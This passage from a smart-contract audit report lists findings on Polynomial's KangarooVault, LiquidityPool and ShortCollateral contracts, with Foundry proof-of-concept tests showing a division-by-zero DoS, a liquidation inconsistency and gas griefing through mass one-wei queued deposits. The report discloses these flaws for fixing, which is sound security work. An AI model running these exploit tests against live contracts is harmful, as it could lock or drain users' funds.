As shown by the code below, calling the `KangarooVault.transferPerpMargin` and `KangarooVault._openPosition` functions would revert if `baseAssetPrice` returned by `LIQUIDITY_POOL.baseAssetPrice()` is 0 no matter what the returned `isInvalid` is. This means that the price returned by `perpMarket.assetPrice()` should not be trusted and used whenever such price is 0.

```solidity
    function transferPerpMargin(int256 marginDelta) external requiresAuth nonReentrant {
        if (marginDelta < 0) {
            ...
            (uint256 baseAssetPrice, bool isInvalid) = LIQUIDITY_POOL.baseAssetPrice();
            require(!isInvalid && baseAssetPrice != 0);
            ...
        } else {
            ...
        }
        ...
    }
```

```solidity
    function _openPosition(uint256 amt, uint256 minCost) internal {
        ...
        (uint256 baseAssetPrice, bool isInvalid) = LIQUIDITY_POOL.baseAssetPrice();
        require(!isInvalid && baseAssetPrice != 0);
        ...
    }
```

However, some functions that call the `Exchange.getMarkPrice` function do not additionally check if the `Exchange.getMarkPrice` function's returned `markPrice` is 0, which can lead to unexpected consequences. For example, the following `KangarooVault.removeCollateral` function executes `(uint256 markPrice,) = LIQUIDITY_POOL.getMarkPrice()`. When `markPrice` is 0, which is caused by a 0 `spotPrice` returned by `perpMarket.assetPrice()`, such price should be considered as invalid and should not be used; yet, in this case, such 0 `markPrice` can cause `minColl` to also be 0, which then makes `require(positionData.totalCollateral >= minColl + collateralToRemove)` much more likely to be passed. In this situation, calling the `KangarooVault.removeCollateral` function can remove the specified `collateralToRemove` collateral from the Power Perp position but this actually should not be allowed because such 0 `spotPrice` and 0 `markPrice` should be considered as invalid and should not be used.

```solidity
    function removeCollateral(uint256 collateralToRemove) external requiresAuth nonReentrant {
        (uint256 markPrice,) = LIQUIDITY_POOL.getMarkPrice();
        uint256 minColl = positionData.shortAmount.mulWadDown(markPrice);
        minColl = minColl.mulWadDown(collRatio);

        require(positionData.totalCollateral >= minColl + collateralToRemove);

        usedFunds -= collateralToRemove;
        positionData.totalCollateral -= collateralToRemove;

        emit RemoveCollateral(positionData.positionId, collateralToRemove);
    }
```

```solidity
    function getMarkPrice() public view override returns (uint256, bool) {
        return exchange.getMarkPrice();
    }
```

### Proof of Concept

The following steps can occur for the described scenario.

1.  The `KangarooVault.removeCollateral` function is called with `collateralToRemove` being 100e18.
2.  `markPrice` returned by `LIQUIDITY_POOL.getMarkPrice()` is 0 because a 0 `spotPrice` is returned by `perpMarket.assetPrice()`.
3.  Due to the 0 `markPrice`, `minColl` is 0, and `positionData.totalCollateral >= minColl + collateralToRemove` can be true even if `positionData.totalCollateral` is also 100e18 at this moment.
4.  Calling the `KangarooVault.removeCollateral` function does not revert, and 100e18 collateral is remove from the Power Perp position.
5.  However, a 0 `spotPrice` returned by `perpMarket.assetPrice()` and a 0 `markPrice` returned by `LIQUIDITY_POOL.getMarkPrice()` should be considered as invalid and should not be used. In this case, removing 100e18 collateral from the Power Perp position should not be allowed or succeed but it does.

### Tools Used

VSCode

### Recommended Mitigation Steps

Functions, such as the `KangarooVault.removeCollateral` function, that call the `Exchange.getMarkPrice` function can be updated to additionally check if the `Exchange.getMarkPrice` function's returned `markPrice` is 0. If it is 0, calling these functions should revert.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/220#issuecomment-1497321528)**



***

## [[M-06] `KangarooVault._resetTrade`, `LiquidityPool.rebalanceMargin`, and `LiquidityPool._getTotalMargin` functions should check `isInvalid`, which is returned by external perp market contract's `remainingMargin` function, and revert if such `isInvalid` is true](https://github.com/code-423n4/2023-03-polynomial-findings/issues/219)
*Submitted by [rbserver](https://github.com/code-423n4/2023-03-polynomial-findings/issues/219), also found by [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/145)*

The following `KangarooVault._resetTrade`, `LiquidityPool.rebalanceMargin`, and `LiquidityPool._getTotalMargin` functions call the external perp market contract's `remainingMargin` function to get the remaining margin for the `KangarooVault` or `LiquidityPool`. Yet, none of these functions use `isInvalid` that can be returned by such `remainingMargin` function. When the returned remaining margin is invalid, such value should not be trusted and used. Using such invalid remaining margin can have negative effects.

```solidity
    function _resetTrade() internal {
        positionData.positionId = 0;
        (uint256 totalMargin,) = PERP_MARKET.remainingMargin(address(this));
        PERP_MARKET.transferMargin(-int256(totalMargin));
        usedFunds -= totalMargin;
        ...
    }
```

```solidity
    function rebalanceMargin(int256 marginDelta) external requiresAuth nonReentrant {
        int256 currentPosition = _getTotalPerpPosition();
        uint256 marginRequired = _calculateMargin(currentPosition);
        (uint256 currentMargin,) = perpMarket.remainingMargin(address(this));

        int256 additionalMargin = marginDelta;

        if (currentMargin >= marginRequired) {
            marginDelta -= int256(currentMargin - marginRequired);
        } else {
            marginDelta += int256(marginRequired - currentMargin);
        }
        ...
    }
```

```solidity
    function _getTotalMargin() internal view returns (uint256) {
        (uint256 margin,) = perpMarket.remainingMargin(address(this));

        return margin;
    }
```

For example, we can compare the `KangarooVault.getTokenPrice` and `LiquidityPool.getTokenPrice` functions. The following `KangarooVault.getTokenPrice` function checks the `isInvalid` returned by `PERP_MARKET.remainingMargin(address(this))` so calling it will revert if `PERP_MARKET.remainingMargin(address(this))`'s returned `totalMargin` is invalid. In contrast, the `LiquidityPool.getTokenPrice` function does not do this.

```solidity
    function getTokenPrice() public view returns (uint256) {
        ...
        (totalMargin, isInvalid) = PERP_MARKET.remainingMargin(address(this));
        require(!isInvalid);
        ...
    }
```

In the following `LiquidityPool.getTokenPrice` function, when `_getTotalMargin()`'s returned `totalMargin`, which is also `margin` returned by `perpMarket.remainingMargin(address(this))` in the `LiquidityPool._getTotalMargin` function, is invalid, such `totalMargin` is still used to increase `totalValue`, which then affects the liquidity token's price. The `LiquidityPool.getTokenPrice` function is called in functions like `LiquidityPool.deposit` and `LiquidityPool.withdraw`. Thus, calling such functions would not revert when such invalid `totalMargin` is used. As a result, the depositing and withdrawal actions that should not be allowed because of such invalid `totalMargin` can still be allowed unexpectedly.

```solidity
    function getTokenPrice() public view override returns (uint256) {
        if (totalFunds == 0) {
            return 1e18;
        }

        uint256 totalSupply = liquidityToken.totalSupply() + totalQueuedWithdrawals;
        int256 skew = _getSkew();

        if (skew == 0) {
            return totalFunds.divWadDown(totalSupply);
        }

        (uint256 markPrice, bool isInvalid) = getMarkPrice();
        require(!isInvalid);

        uint256 totalValue = totalFunds;

        uint256 amountOwed = markPrice.mulWadDown(powerPerp.totalSupply());
        uint256 amountToCollect = markPrice.mulWadDown(shortToken.totalShorts());
        uint256 totalMargin = _getTotalMargin();

        totalValue += totalMargin + amountToCollect;
        totalValue -= uint256((int256(amountOwed) + usedFunds));

        return totalValue.divWadDown(totalSupply);
    }
```

### Proof of Concept

The following steps can occur for the described scenario.

1.  The `LiquidityPool.deposit` function is called to deposit some sUSD tokens.
2.  When the `LiquidityPool.getTokenPrice` function is called, `_getTotalMargin()`'s returned `totalMargin`, which is `margin` returned by `perpMarket.remainingMargin(address(this))`, is invalid. However, such invalid `totalMargin`  does not cause calling the `LiquidityPool.getTokenPrice` function to revert.
3.  The deposit action succeeds while the used liquidity token's price that depends on the invalid `totalMargin` is inaccurate. Such deposit action should not be allowed but it is.

### Tools Used

VSCode

### Recommended Mitigation Steps

The `KangarooVault._resetTrade`, `LiquidityPool.rebalanceMargin`, and `LiquidityPool._getTotalMargin` functions can be updated to check `isInvalid` that is returned by the external perp market contract's `remainingMargin` function. If such `isInvalid` is true, calling these functions should revert.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/219#issuecomment-1497320307)**



***

## [[M-07] `usedFunds` can be greater than `totalFunds` in contract `KangarooVault`, which leads to `KangarooVault` being unable to close its trades and users being unable to withdraw](https://github.com/code-423n4/2023-03-polynomial-findings/issues/203)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/203)*

`KangarooVault` contract can't close the trades and users can't withdraw from it, then users and `KangarooVaults` will lose a lot of funds.

### Proof of concept

1.  In contract `KangarooVault`, `usedFunds` is the uint256 variable which tracks the funds utilitized from the vault. And `totalFunds` is the uin256 variable which tracks the funds claimed by vault from profits and users' depositing.
2.  Contract `KangarooVault` has no check if `totalFunds` >= `usedFunds` when `usedFunds` is increased (transfer from vault) or `totalFunds` is decreased (transfer to vault).
3.  If someone transfers funds directly into the vault, `usedFunds` can be greater than `totalFunds` because the vault can transfer out more than `totalFunds`.
4.  When `usedFunds` > `totalFunds`, KangarooVault can not close its trades because it will revert on underflow in function `_resetTrade`:

```solidity
function _resetTrade() internal {
        ...
        totalFunds -= usedFunds;
        ...
    }
```

5.  When `usedFunds` > `totalFunds`, user can't not withdraw by function `processWithdrawalQueue` because it will revert on underflow.

```solidity
function processWithdrawalQueue(uint256 idCount) external nonReentrant {
    for (uint256 i = 0; i < idCount; i++) {
        ...

        uint256 availableFunds = totalFunds - usedFunds;

        ...
```

**Scenario:**

*   A deposit 1000 SUSD, then `totalFunds` = 1000 SUSD, `usedFunds` = 0
*   B transfer directly 1000 SUSD to the KangarooVault, that doesn't change `totalFunds` and `usedFunds`
*   KangarooVault opens a short position and uses 2000 SUSD to increase the margin, then `usedFunds` = 2000
*   After that, `usedFunds` > `totalFunds` (2000 > 1000) then KangarooVault can't close its position

### Recommended Mitigation Steps

Should add the checks if `totalFunds` >= `usedFunds` when increasing `usedfunds` or decreasing `totalFunds` in contract `KangarooVault.sol`.

**[mubaris (Polynomial) acknowledged, but disagreed with severity](https://github.com/code-423n4/2023-03-polynomial-findings/issues/203#issuecomment-1494189277)**

**[Dravee (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-polynomial-findings/issues/203#issuecomment-1532110220)**



***

## [[M-08] LiquidityPool can be DoS when a complete withdrawal is performed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/157)
*Submitted by [peakbolt](https://github.com/code-423n4/2023-03-polynomial-findings/issues/157), also found by [auditor0517](https://github.com/code-423n4/2023-03-polynomial-findings/issues/222)*

`LiquidityPool` can be DoS when all funds are withdrawn from the pool, causing `getTokenPrice()` to revert due to zero `totalSupply()`.

### Impact

The  `LiquidityPool` will not be able to proceed and requires new deployment of the contracts.

### Detailed Explanation

The `LiquidityPool.getTokenPrice()` will encounter a division by zero error when the `totalSupply` is zero but the `totalFunds` is non-zero. This could occur when there are partial withdrawals, causing totalFunds to be non-zero after a complete withdrawal, due to rounding from the withdrawals.

    function getTokenPrice() public view override returns (uint256) {
        if (totalFunds == 0) {
            return 1e18;
        }

        uint256 totalSupply = liquidityToken.totalSupply() + totalQueuedWithdrawals;
        int256 skew = _getSkew();

        if (skew == 0) {
            return totalFunds.divWadDown(totalSupply);
        }

        (uint256 markPrice, bool isInvalid) = getMarkPrice();
        require(!isInvalid);

        uint256 totalValue = totalFunds;

        uint256 amountOwed = markPrice.mulWadDown(powerPerp.totalSupply());
        uint256 amountToCollect = markPrice.mulWadDown(shortToken.totalShorts());
        uint256 totalMargin = _getTotalMargin();

        totalValue += totalMargin + amountToCollect;
        totalValue -= uint256((int256(amountOwed) + usedFunds));

        return totalValue.divWadDown(totalSupply);
    }

### Proof of Concept

Add the following test case to `test/LiquidityPool.Trades.t.sol`

    function testLiquidityPoolTokenPriceError() public {
        uint256 longAmount = 100e18;
        int256 skew = pool.getSkew();
        assertEq(skew, 0);

        // make some trades for pool to earn fees
        susd.mint(user_1, 100e18);
        openLong(longAmount, longAmount * 1000, user_1);
        setAssetPrice(initialPrice * 99 / 100);
        closeLong(longAmount, 0, user_1);

        // Queue withdrawal. This was deposited in TestSystem.preparePool()
        pool.queueWithdraw(1_000_000e18, address(this));
        skip(14500);

        // This will perform a partial withdrawals due to margin in perpMarket
        // we use this just to trigger some rounding so that 
        // totalFunds wont be zero during we fully withdraw from the pool
        pool.processWithdraws(1);

        // Transfer back margins from perpMarket so that
        // we can continue to withdraw the balance.
        pool.rebalanceMargin(-70567200000000000000000);

        // This will do a complete withdrawals, reducing totalSupply to zero.
        // However, getTokenPrice() will encounter division by zero error.
        // That is because there will be small amount of totalFund left due to rounding.
        pool.processWithdraws(1);

        // approve funds for deposit again
        susd.approve(address(pool), 1_000_000e18);

        // This deposit will revert as LiquidityPool.getTokenPrice() 
        // will encounter division by zero error.
        vm.expectRevert();
        pool.deposit(1_000_000e18, address(this));

    }

### Recommended Mitigation Steps

Add in validation to check and handle when totalSupply is zero.

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/157#issuecomment-1497305448)**



***

## [[M-09] Short positions with minimum collateral can be liquidated even though `canLiquidate()` returns `false`](https://github.com/code-423n4/2023-03-polynomial-findings/issues/146)
*Submitted by [MiloTruck](https://github.com/code-423n4/2023-03-polynomial-findings/issues/146), also found by [joestakey](https://github.com/code-423n4/2023-03-polynomial-findings/issues/174) and [Nyx](https://github.com/code-423n4/2023-03-polynomial-findings/issues/102)*

Frontends or contracts that rely on `canLiquidate()` to determine if a position is liquidatable could be incorrect. Users could think their positions are safe from liquidation even though they are liquidatable, leading to them losing their collateral.

### Vulnerability Details

In the `ShortCollateral` contract, `canLiquidate()` determines if a short position can be liquidated using the following formula:

```solidity
uint256 minCollateral = markPrice.mulDivUp(position.shortAmount, collateralPrice);
minCollateral = minCollateral.mulWadDown(collateral.liqRatio);

return position.collateralAmount < minCollateral;
```

Where:

*   `position.collateralAmount` - Amount of collateral in the short position.
*   `minCollateral` - Minimum amount of collateral required to avoid liquidation.

From the above, a short position can be liquidated if its collateral amount is **less than** `minCollateral`. This means a short position with the minimum collateral amount (ie. `position.collateralAmount == minCollateral`)  cannot be liquidated.

However, this is not the case in `maxLiquidatableDebt()`, which is used to determine a position's maximum liquidatable debt:


```solidity
uint256 safetyRatioNumerator = position.collateralAmount.mulWadDown(collateralPrice);
uint256 safetyRatioDenominator = position.shortAmount.mulWadDown(markPrice);
safetyRatioDenominator = safetyRatioDenominator.mulWadDown(collateral.liqRatio);
uint256 safetyRatio = safetyRatioNumerator.divWadDown(safetyRatioDenominator);

if (safetyRatio > 1e18) return maxDebt;

maxDebt = position.shortAmount / 2;
```

Where:

*   `safetyRatio` - Equivalent to `position.collateralAmount / minCollateral`. Can be seen as a position's collateral amount against the minimum collateral required.
*   `maxDebt` - The amount of debt liquidatable. Defined as 0 at the start of the function.

As seen from the `safetyRatio > 1e18` check, a position is safe from liquidation (ie. `maxDebt = 0`) if  its `safetyRatio` is **greater than** 1.

Therefore, as a position with the minimum collateral amount has a `safetyRatio` of 1, half its debt becomes liquidatable. This contradicts `canLiquidate()`, which returns `false` for such positions.

### Proof of Concept

The following test demonstrates how a position with minimum collateral is liquidatable even though `canLiquidate()` returns `false`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {TestSystem, Exchange, ShortToken, ShortCollateral, PowerPerp, MockERC20Fail} from "./utils/TestSystem.sol";

contract CanLiquidateIsInaccurate is TestSystem {
    // Protocol contracts
    Exchange private exchange;
    ShortToken private shortToken;
    ShortCollateral private shortCollateral;
    
    // sUSD token contract
    MockERC20Fail private SUSD;
    
    function setUp() public {  
        // Set liquidation ratio of sUSD to 125%  
        susdLiqRatio = 1.24e18;

        // Deploy contracts
        deployTestSystem();
        initPool();
        initExchange();
        preparePool();

        exchange = getExchange();
        shortToken = getShortToken();
        shortCollateral = getShortCollateral();
        SUSD = getSUSD();

        // Mint sUSD for user_1
        SUSD.mint(user_1, 1e20);

        // Mint powerPerp for user_2
        vm.prank(address(exchange));
        getPowerPerp().mint(user_2, 1e20);
    }

    function testCanLiquidateMightBeWrong() public {
        // Initial price of base asset is 1e18
        uint256 initialPrice = 1e18;
        setAssetPrice(initialPrice);

        // Open short position with 1e15 sUSD as collateral
        Exchange.TradeParams memory tradeParams;
        tradeParams.amount = 1e18;
        tradeParams.collateral = address(SUSD);
        tradeParams.collateralAmount = 1e15;
        tradeParams.minCost = 0;

        vm.startPrank(user_1);
        SUSD.approve(address(exchange), tradeParams.collateralAmount);
        (uint256 positionId,) = exchange.openTrade(tradeParams);
        vm.stopPrank();
       
        // Initial price of base asset increases, such that minCollateral == collateralAmount
        setAssetPrice(1270001270001905664);

        // canLiquidate() returns false
        assertFalse(shortCollateral.canLiquidate(positionId));

        // However, maxLiquidatableDebt() returns half of original amount
        assertEq(shortCollateral.maxLiquidatableDebt(positionId), tradeParams.amount / 2);

        // Other users can liquidate the short position
        vm.prank(user_2);
        exchange.liquidate(positionId, tradeParams.amount);

        // Position's shortAmount and collateral is reduced
        (, uint256 remainingAmount, uint256 remainingCollateralAmount, ) = shortToken.shortPositions(positionId);
        assertEq(remainingAmount, tradeParams.amount / 2);
        assertLt(remainingCollateralAmount, tradeParams.collateralAmount);
    }
}
```

### Recommended Mitigation

Consider making short positions safe from liquidation if their `safetyRatio` equals to 1:

`ShortCollateral.sol#L235`:

```diff
-        if (safetyRatio > 1e18) return maxDebt;
+        if (safetyRatio >= 1e18) return maxDebt;
```

**[mubaris (Polynomial) confirmed](https://github.com/code-423n4/2023-03-polynomial-findings/issues/146#issuecomment-1497302310)**



***

## [[M-10] Malicious users can exploit deposit and withdrawal queueing in `KangarooVault` and `LiquidityPool` contracts to force exorbitant transaction fees](https://github.com/code-423n4/2023-03-polynomial-findings/issues/123)
*Submitted by [bytes032](https://github.com/code-423n4/2023-03-polynomial-findings/issues/123), also found by [peanuts](https://github.com/code-423n4/2023-03-polynomial-findings/issues/265), [juancito](https://github.com/code-423n4/2023-03-polynomial-findings/issues/262), [sorrynotsorry](https://github.com/code-423n4/2023-03-polynomial-findings/issues/193), [0xbepresent](https://github.com/code-423n4/2023-03-polynomial-findings/issues/122), [PaludoX0](https://github.com/code-423n4/2023-03-polynomial-findings/issues/77), and [0xbepresent](https://github.com/code-423n4/2023-03-polynomial-findings/issues/64)*

Direct loss of money for users who have deposited funds and wish to withdraw them, as they would be required to pay extremely high gas fees due to the queuing mechanism exploited by the attacker.

### Proof of Concept

The affected contracts, `KangarooVault` and `LiquidityPool`, provide the functionality for instant deposits and withdrawals of tokens. However, in certain scenarios, deposits and withdrawals can be queued.

In both cases, the deposit transfers the `sUSD` from your address immediately. In the instant deposit scenario,mints you Vault or Liquidity token - depending on the contract. On the other hand, queuing it adds you to the deposit queue, by creating a "QueuedDeposit" object and sets its id to the current value of `nextQueuedDepositId` (mentioning that, because its going to be important later)

```solidity
        QueuedDeposit storage newDeposit = depositQueue[nextQueuedDepositId];
        newDeposit.id = nextQueuedDepositId++;
        newDeposit.user = user;
        newDeposit.depositedAmount = amount;
        newDeposit.requestedTime = block.timestamp;
        totalQueuedDeposits += amount;
```

In `KangarooVault`, the deposits are queued ONLY If there are currently active positions.

```solidity
    function initiateDeposit(address user, uint256 amount) external nonReentrant {
        require(user != address(0x0));
        require(amount >= minDepositAmount);

        // Instant processing
        if (positionData.positionId == 0) {
            uint256 tokenPrice = getTokenPrice();
            uint256 tokensToMint = amount.divWadDown(tokenPrice);
            VAULT_TOKEN.mint(user, tokensToMint);
            totalFunds += amount;
            emit ProcessDeposit(0, user, amount, tokensToMint, block.timestamp);
        } else {
            // Queueing the deposit request
            QueuedDeposit storage newDeposit = depositQueue[nextQueuedDepositId];

            newDeposit.id = nextQueuedDepositId++;
            newDeposit.user = user;
            newDeposit.depositedAmount = amount;
            newDeposit.requestedTime = block.timestamp;

            totalQueuedDeposits += amount;
            emit InitiateDeposit(newDeposit.id, msg.sender, user, amount);
        }

        // SUSD checks for zero address
        SUSD.safeTransferFrom(msg.sender, address(this), amount);
    }
```

On the other hand, in `LiquidityPool` (`LiquidityPool.sol#L201-L216`) instant deposits have a fee whereas the regular deposits don't have a fee. After discussing with the protocol team, queue deposits its primarily for the regular traders, because the price won't fluctate that much and instant is mostly for other protocols to build on top.

```solidity
    function queueDeposit(uint256 amount, address user)
        external
        override
        nonReentrant
        whenNotPaused("POOL_QUEUE_DEPOSIT")
    {
        QueuedDeposit storage newDeposit = depositQueue[nextQueuedDepositId];
        newDeposit.id = nextQueuedDepositId++;
        newDeposit.user = user;
        newDeposit.depositedAmount = amount;
        newDeposit.requestedTime = block.timestamp;
        totalQueuedDeposits += amount;
        SUSD.safeTransferFrom(msg.sender, address(this), amount);

        emit InitiateDeposit(newDeposit.id, msg.sender, user, amount);
    }
```

Finally, the deposits are processed in a nearly identical way (`LiquidityPool`, `KangarooVault`). Below, I've only extracted the vulnerable code which contains a for loop that iterates through a specified number of deposits, denoted by the variable `count`. The main purpose of this loop is to process each deposit in the queue and update the overall state of the contract.

At the beginning of each iteration, the function accesses the deposit at the current `queuedDepositHead` position in the `depositQueue`. The deposit's `requestedTime` is then evaluated to ensure that it is not equal to 0 and that the current block timestamp exceeds the deposit's `requestedTime` plus the `minDepositDelay`. If either of these conditions is true, the function terminates early, halting further deposit processing.

Upon passing the aforementioned check, it mints the tokens for the user and updates the contract accounting balance. Finally, the `queuedDepositHead` is incremented, advancing to the next deposit in the queue.

We can conclude that:

*   `queuedDepositHead` = the next in line deposit to be executed
*   `nextQueuedDepositId` = currently, the last deposit id in the queue

As a result, this means all the deposits are executed in sequential order and if there are currently 10 deposits and yours is the 11th, if you want to process your own, you have to process the 10 before that or wait for somebody else to process them.

```solidity
      for (uint256 i = 0; i < count; i++) {
            QueuedDeposit storage current = depositQueue[queuedDepositHead];

            if (current.requestedTime == 0 || block.timestamp < current.requestedTime + minDepositDelay) {
                return;
            }

            uint256 tokensToMint = current.depositedAmount.divWadDown(tokenPrice);

            current.mintedTokens = tokensToMint;
            totalQueuedDeposits -= current.depositedAmount;
            totalFunds += current.depositedAmount;
            liquidityToken.mint(current.user, tokensToMint);

            emit ProcessDeposit(current.id, current.user, current.depositedAmount, tokensToMint, current.requestedTime);

            current.depositedAmount = 0;
            queuedDepositHead++;
        }
```

The queuing mechanism can be exploited by a malicious actor, who can queue a large number of deposits or withdrawals for a very low cost. This essentially locks all the deposited funds in the contract and forces the users to pay extremely high gas fees to process their transactions. This vulnerability can be exploited in a similar way for both contracts.

This can be mitigated to extent by the `minDepositAmount` variable, but that will just make the attack vector a bit more expensive for the attacker and the vulnerability would still be there.

To apply that to real world, assume the following scenario:

1.  Alice queues 10000 deposits for 1 wei
2.  Bob queues 1 deposit for 1e18

Since there's no way to force Alice to process her deposits, Bob can either wait for somebody else to process them or process them himself. However, whoever does that will have to pay enormous amount of gas fees.

Here's a PoC using Foundry, making use of `LiquidityPoolTest` (`LiquidityPool.Deposits.t.sol#L12`) test suite. However, it would work pretty much in the same way for `KangarooVault`, where the only prerequisite would be that there have to be currently active positions.

```solidity
  function testDepositFee() public {
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        susd.mint(alice, 1e18);
        susd.mint(bob, 1e18);
        
        vm.startPrank(alice);
        susd.approve(address(pool), 1e18);

        for(uint256 i = 0; i < 100000; i++) {
            pool.queueDeposit(1 wei, alice);
        }
        vm.stopPrank();

        vm.startPrank(bob);
        susd.approve(address(pool), 1e18);
        pool.queueDeposit(1e18, address(bob));

        vm.warp(block.timestamp + pool.minDepositDelay());

        pool.processDeposits(100001);

        vm.stopPrank();
  }
```

To see the result yielded by running the test using the following command `forge t --match-test testDepositFee -vv --gas-report`, see the warden's [original submission](https://github.com/code-423n4/2023-03-polynomial-findings/issues/123).

The same scenario can happen when processing withdrawals. If we expand the example to extreme values (100,000,000 deposits), this would mean that the approximate gas to be paid for users that want to withdraw their funds equal approximately 2448749420000, which converted to today's ETH:USD ratio is around 4070335.77 USD.

### Tools Used

Manual review, foundry.

### Recommended Mitigation Steps

My recommendations for this vulnerability are the following:

1.  Replace the sequential processing of deposits and withdrawals with functionality where users can execute their own deposits and withdrawals without having to process all the deposits and withdrawals before theirs.
2.  If you insist keeping the sequential processing, add a mechanism to cancel deposits but still implement the second part of point 1.

**[Dravee (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/123#issuecomment-1532348205):**
 > Due to the high quality of the report and the details given (particularly, the real impact on the user's funds), I'll be selecting this for the report.<br>
> While High Severity can be defended here, I believe this to be more of a Griefing attack (Medium Severity, no profit motive for an attacker, but damage done to the users or the protocol).<br>
> The user's assets in the protocol aren't at direct risk, even if they need to pay more Gas (on Optimism).<br>
> On Immunefi, "Theft of gas" or "Unbounded gas consumption" are considered Medium Severity issues, and some projects even put "Loss of gas costs or funds will not be considered ‘loss of funds’" in their OOS section (like Olympus).<br>
> Hence the Medium Severity.

**[mubaris (Polynomial) confirmed via duplicate issue `#122`](https://github.com/code-423n4/2023-03-polynomial-findings/issues/122#issuecomment-1495765466)**



***

## [[M-11] The Liquidity Pool will lack margin of Synthetix perpetual market, if `liquidationBufferRatio` of contract `PerpsV2MarketSettings` from Synthetix is updated](https://github.com/code-423n4/2023-03-polynomial-findings/issues/120)
*Submitted by [KIntern\_NA](https://github.com/code-423n4/2023-03-polynomial-findings/issues/120)*

The Liquidity Pool can lack the margin of PerpMarket if `liquidationBufferRatio` of contract `PerpsV2MarketSettings` from Synthetix is greater than 1e18. Then the delay orders of the pool can not be executed and the position of the pool might be liquidated.

### Proof of concept

*   Function `_calculateMargin` returns the margin amount needed to transfer with the specific size of `PerpMarket`.

```solidity
function _calculateMargin(int256 size) internal view returns (uint256 margin) {
    (uint256 spotPrice, bool isInvalid) = baseAssetPrice();

    require(!isInvalid || spotPrice > 0);

    uint256 absSize = size.abs();
    margin = absSize.mulDivDown(spotPrice, futuresLeverage);
}
```

*   When `LiquidityPool` executes a delayed order of Synthetix, function `_updatePositionMargin` (`PerpsV2MarketProxyable.sol#L133`) from PerpsV2Market of Synthetix will be called. It will check the margin of the new position in the perps market:

```solidity
uint liqPremium = _liquidationPremium(position.size, price);
uint liqMargin = _liquidationMargin(position.size, price).add(liqPremium);
_revertIfError(
    (margin < _minInitialMargin()) ||
        (margin <= liqMargin) ||
        (_maxLeverage(_marketKey()) < _abs(_currentLeverage(position, price, margin))),
    Status.InsufficientMargin
);
```

*   Function `_liquidationMargin` (`PerpsV2MarketBase.sol#L390`) returns the maximum of margin that will be liquidated with the position size of perps market. Then the new margin must to be greater than `_liquidationMargin`.

```solidity
 function _liquidationMargin(int positionSize, uint price) internal view returns (uint lMargin) {
    uint liquidationBuffer = _abs(positionSize).multiplyDecimal(price).multiplyDecimal(_liquidationBufferRatio());
    return liquidationBuffer.add(_liquidationFee(positionSize, price));
}
```

*   To calculate the `_liquidationMargin`, `PerpsV2Martket` use the variable `_liquidationBufferRatio` (`MixinPerpsV2MarketSettings.sol#L171`) as the scale of `_abs(positionSize).multiplyDecimal(price)` (value of the position). This variable has getter and setter functions in the contract `PerpsV2MarketSettings` (`PerpsV2MarketSettings.sol`). You can find this contract at <https://optimistic.etherscan.io/address/0x09793Aad1518B8d8CC72FDd356479E3CBa7B4Ad1#code>.
*   `_liquidationBufferRatio` is 1e16 (1%) now but can be changed in the future, and can become market-specific (I asked Synthetix team and they said it will be changed in a couple of weeks, but I didn't know how it will be changed).
*   Since function `_calculateMargin` in contract LiquidityPool doesn't consider this minimum required margin (to not be liquidated), LiquidityPool can lack the margin of perps market in the future.
*   Scenario:

1.  `futuresLeverage` of LiquidityPool is applied to be 5.Then function `_calculateMargin` returns 1/5 (20%) amount of position value (position value = size &ast; spotPrice)
2.  `_liquidationBufferRatio` is set to be 3e17 (30%) in `PerpsV2MarketSettings` contract. Then it requires a margin >= 30% of the position value when updating a position.
3.  LiquidityPool's margin is not enough for its position in PerpsMarket. Then the delay orders of the pool can't be executed and the position of the pool in PerpsMarket can be liquidated

### Recommended Mitigation Steps

Should calculate `_liquidationMargin` from PerpsMarket using the current `_liquidationBufferRatio` from `PerpsV2MarketSettings` contract, to set the minimum margin in function `_calculateMargin`.

**[mubaris (Polynomial) disputed and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/120#issuecomment-1497299040):**
 > Liquidation margin can't be above 1e18. `futuresLeverage` is under the control of the admin and we expect to keep it at respectable values like 2 where Synthetix provides 25x leverage and it is expected to set to 100x in the future.

**[Dravee (judge) invalidated and commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/120#issuecomment-1499844685):**
 > From the warden's submission above:
> 
> > *if liquidationBufferRatio of contract PerpsV2MarketSettings from Synthetix is greater than 1e18*
> 
> > *\_liquidationBufferRatio is 1e16 (1%) now but can be changed in the future, and can become market-specific (I asked Synthetix team and they said it will be changed in a couple of weeks, but I didn't know how it will be changed).*
> 
> ChatGPT to the rescue:
> 
> > *The liquidation buffer ratio is a metric used in cryptocurrency trading to determine the level of risk associated with holding a leveraged position. When trading with leverage, a trader borrows funds to increase their trading position, and the liquidation buffer ratio represents the amount of collateral a trader must hold to avoid being liquidated in the event of a market downturn.*
> > 
> > *The liquidation buffer ratio is calculated by dividing the collateral held by the trader by the notional value of their leveraged position. For example, if a trader has `$10,000` worth of collateral and a leveraged position with a notional value of `$100,000`, their liquidation buffer ratio would be 10% (10,000 / 100,000).*
> > 
> > *If the value of the trader's position falls below a certain threshold determined by the exchange, the trader's position will be automatically liquidated to repay the borrowed funds, which can result in significant losses. Maintaining a sufficient liquidation buffer ratio can help traders manage their risk and avoid liquidation.*
> 
> Hence the starting hypothesis is indeed implausible.

**[duc (warden) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/120#issuecomment-1536546260):**
 > I made a typing mistake in the impact assessment, where the number 1e18 should be 1e16 (1%). This is the current value of `liquidationBufferRatio` in Synthetix perps, although it may change in the future. In the proof of concept, I used 3e17 (30%) as an example, and it is a valid value for `_liquidationBufferRatio`.

**[mubaris (Polynomial) commented](https://github.com/code-423n4/2023-03-polynomial-findings/issues/120#issuecomment-1545204422):**
 > Realistically, the protocol would be using 2-3x leverage (unlike 5x mentioned by the warden). Synthetix changing params takes at least a week and they announce it via SIPs. In that time, we can always reduce the leverage or add additional margin. Also anything above 10% liquidation buffer is absurd.

